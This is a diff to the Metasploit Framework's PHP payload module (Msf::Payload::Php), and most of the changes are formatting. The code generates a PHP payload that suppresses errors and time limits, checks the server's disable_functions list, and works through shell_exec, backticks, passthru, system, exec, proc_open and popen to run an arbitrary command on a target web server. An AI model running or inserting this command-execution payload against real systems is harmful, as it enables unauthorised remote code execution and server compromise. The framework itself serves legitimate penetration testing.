@@ -25,13 +25,12 @@ module Msf::Payload::Php
     # Canonicalize the list of disabled functions to facilitate choosing a
     # system-like function later.
     preamble = "/*<?php /**/
-      @error_reporting(0);
-      @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
+      @error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);
       #{dis}=@ini_get('disable_functions');
       if(!empty(#{dis})){
-        #{dis}=preg_replace('/[, ]+/', ',', #{dis});
-        #{dis}=explode(',', #{dis});
-        #{dis}=array_map('trim', #{dis});
+        #{dis}=preg_replace('/[, ]+/',',',#{dis});
+        #{dis}=explode(',',#{dis});
+        #{dis}=array_map('trim',#{dis});
       }else{
         #{dis}=array();
       }
@@ -70,38 +69,38 @@ module Msf::Payload::Php
     in_array    = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
 
     setup = "
-      if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
+      if (FALSE !== stristr(PHP_OS, 'win' )) {
         #{cmd}=#{cmd}.\" 2>&1\\n\";
       }
       #{is_callable}='is_callable';
       #{in_array}='in_array';
       "
     shell_exec = "
-      if(#{is_callable}('shell_exec')and!#{in_array}('shell_exec',#{dis})){
-        #{output}=shell_exec(#{cmd});
+      if(#{is_callable}('shell_exec')&&!#{in_array}('shell_exec',#{dis})){
+        #{output}=`#{cmd}`;
       }else"
     passthru = "
-      if(#{is_callable}('passthru')and!#{in_array}('passthru',#{dis})){
+      if(#{is_callable}('passthru')&&!#{in_array}('passthru',#{dis})){
         ob_start();
         passthru(#{cmd});
         #{output}=ob_get_contents();
         ob_end_clean();
       }else"
     system = "
-      if(#{is_callable}('system')and!#{in_array}('system',#{dis})){
+      if(#{is_callable}('system')&&!#{in_array}('system',#{dis})){
         ob_start();
         system(#{cmd});
         #{output}=ob_get_contents();
         ob_end_clean();
       }else"
     exec = "
-      if(#{is_callable}('exec')and!#{in_array}('exec',#{dis})){
+      if(#{is_callable}('exec')&&!#{in_array}('exec',#{dis})){
         #{output}=array();
         exec(#{cmd},#{output});
         #{output}=join(chr(10),#{output}).chr(10);
       }else"
     proc_open = "
-      if(#{is_callable}('proc_open')and!#{in_array}('proc_open',#{dis})){
+      if(#{is_callable}('proc_open')&&!#{in_array}('proc_open',#{dis})){
         $handle=proc_open(#{cmd},array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
         #{output}=NULL;
         while(!feof($pipes[1])){
@@ -110,7 +109,7 @@ module Msf::Payload::Php
         @proc_close($handle);
       }else"
     popen = "
-      if(#{is_callable}('popen')and!#{in_array}('popen',#{dis})){
+      if(#{is_callable}('popen')&&!#{in_array}('popen',#{dis})){
         $fp=popen(#{cmd},'r');
         #{output}=NULL;
         if(is_resource($fp)){
